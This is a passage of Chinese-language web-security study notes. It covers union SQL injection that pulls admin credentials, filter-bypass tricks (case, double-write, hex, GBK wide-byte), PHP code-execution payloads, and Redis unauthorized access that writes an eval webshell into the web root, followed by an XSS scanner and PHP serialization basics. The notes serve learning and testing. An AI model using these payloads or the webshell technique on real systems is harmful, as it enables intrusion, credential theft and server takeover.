<p><code>limit 0,1</code>表示限制输出内容为一行，因为数据表展示不下太多的表，所以需要逐行查询，<code>0,1</code>意思是<strong>在第一行的位置查询一个</strong>，同理<code>1,1</code>表示<strong>在第二行位置查询一个</strong>。以此类推</p>
<p>方法二：使用<code>group_concat()</code>将查询内容放在一行以“，”进行分割。如</p>
<p>eg：<code>select * from person where id = 1 union select 1,2,(select group_concat(teble_name) from information_schema.tables where table_schema=database()),4,5;</code></p>
<p><strong>查询字段名</strong></p>
<p><code>information_schema.columns</code>#同样是MySQL5.0以上版本</p>
<p><code>select * from person where id = 1 union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=&#39;admin&#39;,4,5;</code></p>
<p>注意：<strong>很有可能会出现过滤单引号的现象，所以可以使用表名的十六进制表示来绕过</strong>（字符串在线十六进制转换）</p>
<p>admin&#x3D;0x61646D696E</p>
<p><strong>具体数据查询</strong></p>
<p><code>select * from person where id = 1 union select 1,2,(select concat(username,0x5c,password) from admin limit 0,1),4,5;</code>#0x5c是斜杠，使用斜杠来分隔内容“\”</p>
<p><code>select * from person where id = 1 union select 1,2,concat(username,0x5c,password),4,5 from admin limit 0,2 ;</code></p>
<p>也可以如上构造查询数据内容</p>
<p>这种构造同样适用于数据库之类的查询如</p>
<p><code>select * from person where id = 1 union select 1,2,table_name,4,5 from infomation_schema.tables where table_schema = database();</code></p>
<h3 id="数字型注入-1"><a href="#数字型注入-1" class="headerlink" title="数字型注入"></a>数字型注入</h3><p>输入id可控的php代码部分如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>];</span><br><span class="line">	<span class="variable">$conn</span> = <span class="title function_ invoke__">mysql_connect</span>(<span class="string">&#x27;localhost&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;数据库连接失败！&#x27;</span>);</span><br><span class="line">	<span class="title function_ invoke__">mysql_query</span>(<span class="string">&#x27;set names utf-8&#x27;</span>,<span class="variable">$conn</span>);</span><br><span class="line">	<span class="title function_ invoke__">mysql_query</span>(<span class="string">&#x27;use web_sql&#x27;</span>,<span class="variable">$conn</span>);</span><br><span class="line">	<span class="variable">$sql</span> = <span class="string">&quot;select * from person where id = <span class="subst">&#123;$id&#125;</span>&quot;</span>;<span class="comment">#区分数字型还是字符型注入如果没加引号，则为数字类型</span></span><br><span class="line">	<span class="variable">$res</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>,<span class="variable">$conn</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="title function_ invoke__">mysql_error</span>());</span><br><span class="line">	<span class="variable">$arr</span> = <span class="title function_ invoke__">mysql_fetch_assoc</span>(<span class="variable">$res</span>);</span><br><span class="line"><span class="comment">#页面输出代码</span></span><br><span class="line">	&lt;td&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$arr</span>[<span class="string">&#x27;id&#x27;</span>];<span class="meta">?&gt;</span>&lt;/td&gt;</span><br><span class="line">     &lt;td&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$arr</span>[<span class="string">&#x27;name&#x27;</span>];<span class="meta">?&gt;</span>&lt;/td&gt;</span><br><span class="line">     &lt;td&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$arr</span>[<span class="string">&#x27;age&#x27;</span>];<span class="meta">?&gt;</span>&lt;/td&gt;</span><br><span class="line">     &lt;td&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$arr</span>[<span class="string">&#x27;phone&#x27;</span>];<span class="meta">?&gt;</span>&lt;/td&gt;</span><br><span class="line">     &lt;td&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$arr</span>[<span class="string">&#x27;email&#x27;</span>];<span class="meta">?&gt;</span>&lt;/td&gt;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>以上页面只显示第一行，为了显示后面语句，一般来说需要吧union前的查询语句直接报错不显示，故一般使用<code>id=-1</code>之类的错误，使得unino只显示其后查询结果。</p>
<h3 id="字符型注入-1"><a href="#字符型注入-1" class="headerlink" title="字符型注入"></a>字符型注入</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Mysql中注释：#、<span class="comment">--+ 闭合引号、 or &#x27;1</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> articles <span class="keyword">where</span> id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> articles <span class="keyword">where</span> id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="comment">--+&#x27;</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> articles <span class="keyword">where</span> id <span class="operator">=</span> <span class="string">&#x27;-1&#x27;</span> 注入利用语句 <span class="comment">--+&#x27;</span></span><br></pre></td></tr></table></figure>

<p>防护措施，单引号会被过滤，但是需要逃逸单引号</p>
<h3 id="union联合查询绕过过滤技巧"><a href="#union联合查询绕过过滤技巧" class="headerlink" title="union联合查询绕过过滤技巧"></a>union联合查询绕过过滤技巧</h3><p>不适用union联合查询的情况</p>
<ul>
<li>union关键字被完全过滤</li>
<li>页面中无返回查询数据</li>
</ul>
<h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><p>php中常用的过滤函数<code>str_replace()</code></p>
<p><code>str_replace(find,replace,string,count)</code></p>
<table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>find</td>
<td>必须。规定要查的值</td>
</tr>
<tr>
<td>replace</td>
<td>必须。规定替换find中的值的值</td>
</tr>
<tr>
<td>string</td>
<td>必须。规定被搜索的字符串</td>
</tr>
<tr>
<td>count</td>
<td>可选。对替换数进行计数的变量</td>
</tr>
</tbody></table>
<p>返回带有替换值的字符串或数组，php使用代码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="string">&quot;union&quot;</span>,<span class="string">&quot;sleep&quot;</span>,<span class="string">&quot;benchmark&quot;</span>,<span class="string">&quot;floor&quot;</span>);<span class="comment">#设置被过滤的字符串</span></span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;select * from admin where id = 1 union 1,2,3,4,5&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">str_replace</span>(<span class="variable">$arr</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$sql</span>,<span class="variable">$i</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;替换数&quot;</span>: <span class="variable">$i</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>将array中的四个字符替换为空</p>
<p>第二种是正则匹配过滤</p>
<p><code>preg_replace()</code></p>
<p><code>mixed preg_replace(mixed $pattern , mixed $replacement, mixed $subject [,int $limit = -1 [,int &amp;$count]])</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$sql</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/union|sleep|benchmark|floor/&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$sql</span>);<span class="comment">#替换关键字形式的正则表达式</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$sql</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;<span class="comment">#换行</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>第三种<code>preg_match()</code>正则匹配，匹配到则退出，代码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * from admin where id = 1 union select 1,2,3,4,5&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/union|benchmark|sleep|floor/i&#x27;</span>,<span class="variable">$sql</span>))&#123;<span class="comment">#如果有i，则可以检测大小写！也即如果没有i，可以选择大小写过滤！</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;sql inject found&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$sql</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>Mysql中，大小写都是可以运行的，而在上述的过滤匹配中，则是严格的按照大小写进行过滤，所以，我们可以使用大小写来绕过过滤</p>
</blockquote>
<h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h3><blockquote>
<p>在使用preg_replace()函数中，默认情况下只进行一次匹配，所以如果匹配到字符替换为空的情况，可能造成双写绕过</p>
</blockquote>
<p>要求十分严格，需要是<code>preg_replace()</code>函数<strong>并且是替换为空的结果</strong>才会产生双写绕过！</p>
<p>比如<code>union</code>替换为 <code>uniunionon</code>。其实这里可以思考的地方，如果替换成了字母“u n i o n”中任何一个，也可以尝试新奇的构造方式进行绕过。</p>
<h3 id="过滤单引号的绕过，十六进制"><a href="#过滤单引号的绕过，十六进制" class="headerlink" title="过滤单引号的绕过，十六进制"></a>过滤单引号的绕过，十六进制</h3><blockquote>
<p>Mysql的sql语句，对于字符串数据必须使用引号，但对于字符串语句，mysql也是别字符串中的每个字符对应的ASCII码的十六进制，因此可以使用0x16进制替换字符串，从而绕过引号对字符串的限制。</p>
</blockquote>
<p><code>addslashes()</code>#函数返回在预定义字符之前添加反斜杠的字符串。</p>
<p>预定义字符是：</p>
<ul>
<li>单引号（’）</li>
<li>双引号（”）</li>
<li>反斜杠（\）</li>
<li>NULL</li>
</ul>
<p>该函数可用于为储存在数据库中的字符串以及数据库查询语句准备字符串。</p>
<p>或者在<code>php.ini</code>配置文件中，开启<code>magic_quotes_gpc</code>选项，此时对于数字型注入来说，如果需要进行数据库中数据获取，需要使用十六进制进行绕过，但是对于字符型注入来说，就需要进行引号逃逸的操作</p>
<h3 id="宽字节注入原理与利用"><a href="#宽字节注入原理与利用" class="headerlink" title="宽字节注入原理与利用"></a>宽字节注入原理与利用</h3><blockquote>
<p>如果数据库中储存数据使用的编码方式是GBK，那么由于用户输入的内容会进行双字节的组合，会导致用户输入的字节与反斜杠组合，从而逃逸引号</p>
</blockquote>
<p><strong>宽字节注入是一种引号逃逸的技巧，利用双字节组合导致注入产生。</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">select * from admin where id = &#x27;1&#x27;;</span><br><span class="line">#如果用户输入单引号，那么此时sql语句为</span><br><span class="line">select * from admin where id = &#x27;1&#x27;&#x27; #经过addslashs函数处理过的SQL语句会变为  --+</span><br><span class="line">select * from admin where id = &#x27;1\&#x27;&#x27; #由于查询的1\&#x27;不存在，此时不会输出数据，也无法进行引号逃逸，但是如果数据库中使用GBK编码数据，此时就可以进行引号逃逸。</span><br><span class="line"></span><br><span class="line">用户输入%df&#x27;经过程序处理#df\&#x27; 此时改为%df%5c 组合GBK识别的汉字，之后闭合单引号即可。</span><br><span class="line"></span><br><span class="line">select * from admin where id = &#x27;1%df&#x27;&#x27;</span><br><span class="line">select * from admin where id = &#x27;1%df\&#x27;&#x27;</span><br><span class="line">select * from admin where id = &#x27;1%df%5c&#x27;&#x27;</span><br><span class="line">select * from admin where id = &#x27;1%df%5c&#x27; --+&#x27;</span><br><span class="line">select * from admin where id = &#x27;1%df%5c&#x27; 注入SQL语句(各种查询) --+&#x27;</span><br></pre></td></tr></table></figure>

<p><strong>限制：只适用于使用GBK编码的数据的数据库！</strong></p>
<p><em><strong>一种完全无法使用联合查询注入的方式<code>preg_match(&#39;/union/i&#39;,$sql)</code>完全过滤</strong></em></p>
<hr>
<p>剩下三种sql注入技巧我先跳过，埋个坑，过几天补。</p>
<h2 id="四、代码执行与命令执行"><a href="#四、代码执行与命令执行" class="headerlink" title="四、代码执行与命令执行"></a>四、代码执行与命令执行</h2><blockquote>
<p>当用户提交的参数被作为代码的时候，此时成为代码注入。广义的代码注入，涵盖大半安全漏洞分类，例如：SQL注入，XSS跨站脚本攻击等等；狭义代码注入：动态代码执行函数的参数过滤不严格导致用户输入数据作为服务端代码执行</p>
</blockquote>
<h3 id="代码执行（相关函数）"><a href="#代码执行（相关函数）" class="headerlink" title="代码执行（相关函数）"></a>代码执行（相关函数）</h3><p>大致分为五类：</p>
<ol>
<li><code>eval</code>+<code>assert</code>函数，会接受字符串作为脚本来执行，显然想到一句话木马</li>
<li><code>preg_replace/e</code>用户替换的内容将会作为代码执行（PHP 5 ）</li>
<li>用户自定义函数</li>
<li>动态函数</li>
<li>其他</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(PHP <span class="number">4</span> ,PHP <span class="number">5</span> ,PHP <span class="number">7</span>)<span class="comment">#把字符串作为PHP代码执行，当用户可以控制字符串，此时就存在代码注入漏洞</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="keyword">string</span> <span class="variable">$code</span>)</span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">	<span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>);<span class="comment">#此时将会执行phpinfo()函数,需要以分号结束！</span></span><br><span class="line">	<span class="title function_ invoke__">assert</span>(<span class="string">&#x27;phpinfo();&#x27;</span>)<span class="comment">#这个函数的分号可加可不加！</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>eval记得加分号！</strong></p>
<p>此时安全人员可能进行的防御手段：加引号</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">	<span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">	<span class="keyword">eval</span>(<span class="string">&quot;\$ret = strtolower(&#x27;<span class="subst">$cmd</span>&#x27;);&quot;</span>);<span class="comment">//strtolower - 将字符串转化为小写,\防止$被转义，只作为字符执行</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>绕过方式：（闭合+注释）</p>
<p>闭合前面的’和括号来逃逸，如</p>
<p><code>http://127.0.0.1/index.php/?cmd=%27);phpinfo();</code>#%27是url编码后的单引号</p>
<p>注意，如果系统开启了GPC（magic_quotes_gpc一般是默认开启的）就无法进行绕过了，会将单引号前加斜杠进行转义，会印象cookie中的’也转义，所以php5.4没有gpc了。</p>
<p>之后版本一般会使用<code>stripslashes()</code>函数进行转义</p>
<p>在php.ini中修改（重启生效）</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">magic_quotes_gpc</span><br><span class="line">	Default Value: on</span><br><span class="line">	Development Value: off</span><br><span class="line">	Production Value: off</span><br></pre></td></tr></table></figure>

<p>第二个<code>preg_replace(&quot;/.*/e&quot;,$replacement,$subject);</code></p>
<p>该正则匹配表达式存在的&#x2F;e修饰符，<strong>会使得replacement参数当做php代码执行</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/abc/e&quot;</span>,<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>],<span class="string">&quot;abcd&quot;</span>);<span class="comment">#_REQUEST会接收GET，POST，Cookie传递的参数，需要匹配到内容才能执行。</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">	<span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">	<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/&lt;data&gt;(.*)&lt;\/data&gt;/e&#x27;</span>,<span class="string">&#x27;$ret=&quot;\\1&quot;;&#x27;</span>,<span class="variable">$cmd</span>);<span class="comment">#\\1匹配第一个传递的代码框，可以使用花括号构造,&lt;\/data&gt;防止转义</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$ret</span>;</span><br><span class="line">    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>为绕过下面的过滤，可以构造payload：</p>
<p><code>http://127.0.0.1/index.php?cmd=&lt;data&gt;&#123;$&#123;phpinfo()&#125;&#125;&lt;/data&gt;</code></p>
<p>第三个<code>create_function</code>主要用来创建匿名函数，如果没有严格对参数传递进行过滤，攻击者可以构造特殊字符串传递给<code>create_function(string $args, string $code)</code>执行任意命令</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$func</span> = <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">	<span class="variable">$func</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>注意该代码传递的是一个完整语句，payload必须加上<code>;</code>分号</p>
<p><strong>动态函数</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;a&#x27;</span>;    </span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">b</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;func&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$myfunc</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;func&#x27;</span>];</span><br><span class="line">        <span class="variable">$myfunc</span>();</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>payload：?func=phpinfo</code></p>
<p>还比如如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>](<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]);<span class="comment">#a作为函数b作为参数</span></span><br></pre></td></tr></table></figure>

<p><code>payload:?a=assert&amp;b=phpinfo</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">call_user_func</span>(<span class="string">&#x27;assert&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="comment">#前面使用一个可以回调的函数名称，后面传参老方式了</span></span><br><span class="line">	</span><br><span class="line">	<span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">	<span class="title function_ invoke__">call_user_func_array</span>(<span class="string">&#x27;assert&#x27;</span>,<span class="variable">$cmd</span>);<span class="comment">#这里cmd内容需要为数组形式</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>所以构造payload可为<code>?cmd[]=phpinfo()</code></p>
<p><code>array,array_filter,array_map</code>等等都可</p>
<p>还有一个可以直接作为php代码进行执行的方式<code>$&#123;phpinfo()&#125;</code>其实就是上面的一个payload</p>
<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>区别于代码执行php代码，命令执行会直接在服务器执行命令</p>
<p><strong>system</strong>函数</p>
<p><strong>exec</strong>函数</p>
<p>以上两者函数都有一个返回值为结果的最后一行，其中exec返回为一个数组，查看内容需要用<code>ver_dump</code>函数</p>
<h2 id="五、Redis未授权访问漏洞"><a href="#五、Redis未授权访问漏洞" class="headerlink" title="五、Redis未授权访问漏洞"></a>五、Redis未授权访问漏洞</h2><blockquote>
<p>漏洞发生在，Redis的错误配置绑定在<code>0.0.0.0:6379</code>，并且在没有开启认证（Redis默认），则该端口可以通过公网直接访问，如果没有采用相关策略如添加防火墙规则避免其他非信任来源ip访问，就会导致Redis的服务暴露在公网ip上，可能造成其它用户直接在非授权的情况下访问Redis五福</p>
</blockquote>
<p>使用nmap扫描6379端口</p>
<p><code>nmap -A -p 6379 --script redis-info ip</code>使用该命令，如果存在漏洞会返回redis info信息</p>
<p>利用，使用<code>redis-cli -h 指定IP -p 指定端口默认6379</code></p>
<p> Redis可以写入磁盘信息，可以写入webshell</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">config set dir /var/www/html#设置写入位置</span><br><span class="line">set x &quot;\n\n\n&lt;?php phpinfo();?&gt;\n\n\n&quot;#x是变量名</span><br><span class="line">set xxx &quot;\n&lt;?php @eval($_POST[&#x27;c&#x27;]);?&gt;\n&quot;</span><br><span class="line">config set dbfilename webshell.php</span><br><span class="line">save</span><br></pre></td></tr></table></figure>

<p>防御：可以在redis.conf文件中的<code>requirepass 123456</code>设置密码</p>
<h2 id="六、XSS自动化检测"><a href="#六、XSS自动化检测" class="headerlink" title="六、XSS自动化检测"></a>六、XSS自动化检测</h2><p>使用python</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">url=<span class="string">&quot;http://127.0.0.1/xxs.php&quot;</span></span><br><span class="line">payload = <span class="string">&quot;&lt;script&gt;alert(&#x27;xss&#x27;);&lt;/script&gt;&quot;</span><span class="comment">#github找一个xsspayload内容存为.txt</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;xss_payload.txt&quot;</span>,<span class="string">&quot;r&quot;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    payload_list = f.readlines()</span><br><span class="line">	<span class="keyword">for</span> payload <span class="keyword">in</span> payload_list:</span><br><span class="line">        payload.strip()</span><br><span class="line">        params=&#123;<span class="string">&quot;a&quot;</span>:payload&#125;<span class="comment">#这个a是php代码中传参的参数,strip去除空格</span></span><br><span class="line">        res = requests.get(url,params=params)</span><br><span class="line">        <span class="keyword">if</span> res.text.find(payload)!=-<span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;xss found&quot;</span>)</span><br><span class="line">            sys.exit()<span class="comment">#退出程序</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;no xss&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="七、SSRF"><a href="#七、SSRF" class="headerlink" title="七、SSRF"></a>七、SSRF</h2><blockquote>
<p>服务器请求伪造(SSRF Server-Side Request Forgery)是一种有Web服务器发出请求的漏洞，它能够请求到与它相连的内网资源(与外网隔离的内部系统)。因此SSRF主要测试目标是企业的内网系统。</p>
</blockquote>
<h2 id="八、PHP序列化安全"><a href="#八、PHP序列化安全" class="headerlink" title="八、PHP序列化安全"></a>八、PHP序列化安全</h2><p><strong>序列化与反序列化</strong></p>
<p>(serialization)序列化：将复杂的数据结构(object)转换为适合与传输保存的字节类型(byte)。(存储)</p>
<p>(Deserialization)反序列化：将字节类型转换为复杂数据结构(object)。(程序使用)</p>
<p><code>PHP,Ruby,Java</code>都用此技术。</p>
<p>PHP序列化操作</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">serialize</span>(<span class="keyword">mixed</span> <span class="variable">$value</span>):<span class="keyword">string</span></span><br></pre></td></tr></table></figure>

<p>试验代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Site</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;ctf&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_name</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="string">&#x27;admin&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$s1</span> = <span class="keyword">new</span> <span class="title class_">Site</span>();<span class="comment">#初始化对象</span></span><br><span class="line"><span class="variable">$s</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$s1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$s</span>);</span><br><span class="line"><span class="variable">$obj</span>-&gt;<span class="title function_ invoke__">get_name</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

